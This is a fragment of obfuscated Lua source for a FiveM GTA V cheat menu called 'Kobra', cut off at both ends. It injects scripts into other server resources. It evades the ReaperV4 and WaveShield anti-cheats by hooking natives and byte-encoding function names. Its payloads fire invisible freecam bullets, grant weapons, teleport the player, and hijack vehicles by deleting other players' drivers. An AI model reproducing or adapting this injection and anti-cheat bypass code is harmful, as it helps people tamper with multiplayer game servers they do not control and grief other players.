                                        print("Zawg")
                                    ]],v1659,v1662));Wait(700 -350 );v1652=6;end if (2==v1652) then hNative("SetCurrentPedWeapon",function(v1743,...) return v1743(...);end);hNative("GetCurrentPedWeapon",function(v1744,...) return v1744(...);end);hNative("RemoveWeaponFromPed",function(v1745,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1746,...) return v1746(...);end);v1652=1186 -(887 + 296) ;end if (v1652==1) then hNative("Wait",function(v1747,...) return v1747(...);end);hNative("PlayerPedId",function(v1748,...) return v1748(...);end);hNative("GetHashKey",function(v1749,...) return v1749(...);end);hNative("GiveWeaponToPed",function(v1750,...) return v1750(...);end);v1652=1047 -(512 + 533) ;end if (v1652==(1424 -(662 + 762))) then v1653=nil;function v1653(v1751) local v1752=677 -(334 + 343) ;local v1753;local v1754;local v1755;while true do if (1==v1752) then v1755=math.abs(math.cos(v1754));return vector3( -math.sin(v1753) * v1755 ,math.cos(v1753) * v1755 ,math.sin(v1754));end if (v1752==(0 -0)) then v1753=math.rad(v1751.z);v1754=math.rad(v1751.x);v1752=490 -(198 + 291) ;end end end function hNative(v1756,v1757) local v1758=0 + 0 ;local v1759;while true do if (v1758==(574 -(141 + 433))) then v1759=_G[v1756];if ( not v1759 or (type(v1759)~="function")) then return;end v1758=4 -3 ;end if (v1758==1) then _G[v1756]=function(...) return v1757(v1759,...);end;break;end end end hNative("CreateThread",function(v1760,...) return v1760(...);end);v1652=1;end if (v1652==6) then ShootSingleBulletBetweenCoords(v1654.x,v1654.y,v1654.z,v1658.x,v1658.y,v1658.z,55 + 45 ,true,v1660,PlayerPedId(),true,false,100777 -(227 + 550) );break;end if (v1652==4) then v1658=v1654 + (v1656 * v1657) ;v1659=PlayerPedId();v1660=GetHashKey(v952);v1661=nil;v1652=12 -7 ;end if (3==v1652) then v1654=GetCamCoord(_G.KobraFreecamObject);v1655=GetCamRot(_G.KobraFreecamObject,5 -3 );v1656=v1653(v1655);v1657=1103 -(72 + 31) ;v1652=352 -(89 + 259) ;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v952   .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local function v1546(v1614) local v1615=0 + 0 ;local v1616;local v1617;local v1618;while true do if (v1615==(1 + 0)) then v1618=math.abs(math.cos(v1617));return vector3( -math.sin(v1616) * v1618 ,math.cos(v1616) * v1618 ,math.sin(v1617));end if (v1615==(0 + 0)) then v1616=math.rad(v1614.z);v1617=math.rad(v1614.x);v1615=1 -0 ;end end end function hNative(v1619,v1620) local v1621=_G[v1619];if ( not v1621 or (type(v1621)~="function")) then return;end _G[v1619]=function(...) return v1620(v1621,...);end;end hNative("CreateThread",function(v1622,...) return v1622(...);end);hNative("Wait",function(v1623,...) return v1623(...);end);hNative("PlayerPedId",function(v1624,...) return v1624(...);end);hNative("GetHashKey",function(v1625,...) return v1625(...);end);hNative("GiveWeaponToPed",function(v1626,...) return v1626(...);end);hNative("SetCurrentPedWeapon",function(v1627,...) return v1627(...);end);hNative("GetCurrentPedWeapon",function(v1628,...) return v1628(...);end);hNative("RemoveWeaponFromPed",function(v1629,...) return;end);local v1547=GetCamCoord(_G.KobraFreecamObject);local v1548=GetCamRot(_G.KobraFreecamObject,2 + 0 );local v1549=v1546(v1548);local v1550=1000;local v1551=v1547 + (v1549 * v1550) ;local v1552=PlayerPedId();local v1553=GetHashKey(v952);GiveWeaponToPed(v1552,v1553,520 -265 ,false,true);MachoInjectThread(0,"ReaperV4","",[[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]]   .. v1553   .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]] );Wait(1653 -(1333 + 70) );ShootSingleBulletBetweenCoords(v1547.x,v1547.y,v1547.z,v1551.x,v1551.y,v1551.z,100,true,v1553,v1552,true,false,101832 -(701 + 1131) );end break;end end elseif ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then print("UPP3R");local function v1526(v1554) local v1555=127 -(55 + 72) ;local v1556;local v1557;local v1558;while true do if (v1555==(157 -(99 + 57))) then v1558=math.abs(math.cos(v1557));return vector3( -math.sin(v1556) * v1558 ,math.cos(v1556) * v1558 ,math.sin(v1557));end if (0==v1555) then v1556=math.rad(v1554.z);v1557=math.rad(v1554.x);v1555=1 -0 ;end end end function hNative(v1559,v1560) local v1561=0 + 0 ;local v1562;while true do if (v1561==(1579 -(1243 + 336))) then v1562=_G[v1559];if ( not v1562 or (type(v1562)~="function")) then return;end v1561=1;end if (v1561==(1330 -(774 + 555))) then _G[v1559]=function(...) return v1560(v1562,...);end;break;end end end hNative("CreateThread",function(v1563,...) return v1563(...);end);hNative("Wait",function(v1564,...) return v1564(...);end);hNative("PlayerPedId",function(v1565,...) return v1565(...);end);hNative("GetHashKey",function(v1566,...) return v1566(...);end);hNative("GiveWeaponToPed",function(v1567,...) return v1567(...);end);hNative("SetCurrentPedWeapon",function(v1568,...) return v1568(...);end);hNative("GetCurrentPedWeapon",function(v1569,...) return v1569(...);end);hNative("RemoveWeaponFromPed",function(v1570,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1571,...) return v1571(...);end);local v1527=GetCamCoord(_G.KobraFreecamObject);local v1528=GetCamRot(_G.KobraFreecamObject,1 + 1 );local v1529=v1526(v1528);local v1530=1799 -(150 + 649) ;local v1531=v1527 + (v1529 * v1530) ;local v1532=PlayerPedId();local v1533=GetHashKey(v952);local function v1534(v1572) local v1573=0;local v1574;while true do if ((0 + 0)==v1573) then v1574={};for v1711=1 -0 , #v1572 do v1574[v1711]=string.byte(v1572,v1711);end v1573=1 -0 ;end if (v1573==(1985 -(1122 + 862))) then return table.concat(v1574,",");end end end local v1535=v1534(v952);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1532,v1535));Wait(287 -137 );ShootSingleBulletBetweenCoords(v1527.x,v1527.y,v1527.z,v1531.x,v1531.y,v1531.z,19 + 81 ,true,v1533,v1532,true,false,100000);end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v952   .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local v1431=0 -0 ;local v1432;local v1433;local v1434;local v1435;local v1436;local v1437;local v1438;local v1439;while true do if (v1431==0) then v1432=nil;function v1432(v1630) local v1631=0 + 0 ;local v1632;local v1633;local v1634;while true do if (v1631==1) then v1634=math.abs(math.cos(v1633));return vector3( -math.sin(v1632) * v1634 ,math.cos(v1632) * v1634 ,math.sin(v1633));end if (v1631==(0 + 0)) then v1632=math.rad(v1630.z);v1633=math.rad(v1630.x);v1631=744 -(549 + 194) ;end end end function hNative(v1635,v1636) local v1637=0 + 0 ;local v1638;while true do if ((3 -2)==v1637) then _G[v1635]=function(...) return v1636(v1638,...);end;break;end if (v1637==(0 + 0)) then v1638=_G[v1635];if ( not v1638 or (type(v1638)~="function")) then return;end v1637=1 -0 ;end end end v1431=1 + 0 ;end if (1==v1431) then hNative("CreateThread",function(v1639,...) return v1639(...);end);hNative("Wait",function(v1640,...) return v1640(...);end);hNative("PlayerPedId",function(v1641,...) return v1641(...);end);v1431=2;end if (v1431==(14 -10)) then v1434=GetCamRot(_G.KobraFreecamObject,1705 -(453 + 1250) );v1435=v1432(v1434);v1436=2838 -1838 ;v1431=5 + 0 ;end if (v1431==(578 -(203 + 372))) then hNative("GetCurrentPedWeapon",function(v1642,...) return v1642(...);end);hNative("RemoveWeaponFromPed",function(v1643,...) return;end);v1433=GetCamCoord(_G.KobraFreecamObject);v1431=1 + 3 ;end if (v1431==(5 -3)) then hNative("GetHashKey",function(v1644,...) return v1644(...);end);hNative("GiveWeaponToPed",function(v1645,...) return v1645(...);end);hNative("SetCurrentPedWeapon",function(v1646,...) return v1646(...);end);v1431=1385 -(978 + 404) ;end if (v1431==5) then v1437=v1433 + (v1435 * v1436) ;v1438=PlayerPedId();v1439=GetHashKey(v952);v1431=19 -13 ;end if ((6 + 0)==v1431) then GiveWeaponToPed(PlayerPedId(),v1439,250,false,true);SetCurrentPedWeapon(PlayerPedId(),v1439,true);ShootSingleBulletBetweenCoords(v1433.x,v1433.y,v1433.z,v1437.x,v1437.y,v1437.z,418 -(56 + 262) ,true,v1439,v1438,true,false,40338 + 59662 );break;end end end break;end if (v951==(114 -(108 + 6))) then v952=v36[v34];if (v952=="WEAPON_PERMKILL") then v952="WEAPON_TRANQUILIZER";elseif (v952=="WEAPON_RPG_2") then v952="WEAPON_AIRSTRIKE_ROCKET";end v951=1 + 0 ;end end end end if IsDisabledControlJustPressed(0 + 0 ,1976 -(653 + 1299) ) then local v835=v627;if (v835=="Teleport") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local function v1340(v1375) local v1376=math.rad(v1375.z);local v1377=math.rad(v1375.x);local v1378=math.abs(math.cos(v1377));return vector3( -math.sin(v1376) * v1378 ,math.cos(v1376) * v1378 ,math.sin(v1377));end function GetEmptySeat(v1379) local v1380=0;local v1381;while true do if ((1 + 0)==v1380) then return  -1;end if (v1380==0) then v1381={ -(1 + 0),0,1 + 0 ,1004 -(16 + 986) };for v1536,v1537 in ipairs(v1381) do if IsVehicleSeatFree(v1379,v1537) then return v1537;end end v1380=1219 -(700 + 518) ;end end end local v1341=GetCamCoord(_G.KobraFreecamObject);local v1342=GetCamRot(_G.KobraFreecamObject,6 -4 );local v1343=v1340(v1342);local v1344=1000;local v1345=v1341 + (v1343 * v1344) ;local v1346=StartShapeTestRay(v1341.x,v1341.y,v1341.z,v1345.x,v1345.y,v1345.z, -(1 -0),PlayerPedId(),1511 -(617 + 894) );local v1347,v1348,v1349,v1347,v1350=GetShapeTestResult(v1346);if v1348 then if ((v1350~=0) and IsEntityAVehicle(v1350)) then local v1464=0;local v1465;local v1466;local v1467;while true do if (v1464==(1 -0)) then v1467=GetEmptySeat(v1465);if (v1467== -(459 -(271 + 187))) then TaskWarpPedIntoVehicle(v1466,v1465, -1);elseif (v1467>=0) then TaskWarpPedIntoVehicle(v1466,v1465,v1467);else print("[^5SYNC^7]: There aren't any seats available in this vehicle.");end break;end if (v1464==(1584 -(731 + 853))) then v1465=v1350;v1466=PlayerPedId();v1464=3 -2 ;end end else SetEntityCoords(PlayerPedId(),v1349.x,v1349.y,v1349.z,false,false,false,false);end else print("[^5SYNC^7]: There aren't any valid locations to teleport to.");end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                if _G.KobraFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5Kobra^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5Kobra^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]]);end elseif _G.KobraFreecamObject then local v1216=1521 -(199 + 1322) ;local v1217;local v1218;local v1219;local v1220;local v1221;local v1222;local v1223;local v1224;local v1225;local v1226;local v1227;while true do if (v1216==(1 -0)) then v1219=GetCamRot(_G.KobraFreecamObject,2 + 0 );v1220=v1217(v1219);v1221=2660 -(1291 + 369) ;v1222=v1218 + (v1220 * v1221) ;v1216=1 + 1 ;end if ((0 + 0)==v1216) then v1217=nil;function v1217(v1404) local v1405=0 + 0 ;local v1406;local v1407;local v1408;while true do if (v1405==(1 + 0)) then v1408=math.abs(math.cos(v1407));return vector3( -math.sin(v1406) * v1408 ,math.cos(v1406) * v1408 ,math.sin(v1407));end if (v1405==0) then v1406=math.rad(v1404.z);v1407=math.rad(v1404.x);v1405=686 -(561 + 124) ;end end end function GetEmptySeat(v1409) local v1410=0 + 0 ;local v1411;while true do if (v1410==1) then return  -1;end if ((853 -(25 + 828))==v1410) then v1411={ -1,0 -0 ,1,2};for v1575,v1576 in ipairs(v1411) do if IsVehicleSeatFree(v1409,v1576) then return v1576;end end v1410=49 -(18 + 30) ;end end end v1218=GetCamCoord(_G.KobraFreecamObject);v1216=2 -1 ;end if ((3 -1)==v1216) then v1223=StartShapeTestRay(v1218.x,v1218.y,v1218.z,v1222.x,v1222.y,v1222.z, -1,PlayerPedId(),0);v1224,v1225,v1226,v1224,v1227=GetShapeTestResult(v1223);if v1225 then if ((v1227~=(0 -0)) and IsEntityAVehicle(v1227)) then local v1538=0;local v1539;local v1540;local v1541;while true do if (v1538==0) then v1539=v1227;v1540=PlayerPedId();v1538=1 + 0 ;end if (v1538==1) then v1541=GetEmptySeat(v1539);if (v1541== -(3 -2)) then TaskWarpPedIntoVehicle(v1540,v1539, -1);elseif (v1541>=(732 -(501 + 231))) then TaskWarpPedIntoVehicle(v1540,v1539,v1541);else print("[^5Kobra^7]: There aren't any seats available in this vehicle.");end break;end end else MachoInjectThread(0,"any","",[[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]]   .. v1226.x   .. [[, ]]   .. v1226.y   .. [[, ]]   .. v1226.z   .. [[, false, false, false, false)
                                    ]] );end else print("[^5Kobra^7]: There aren't any valid locations to teleport to.");end break;end end end elseif (v835=="Kick from Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1228=0 + 0 ;local v1229;while true do if (0==v1228) then v1229=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1229,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
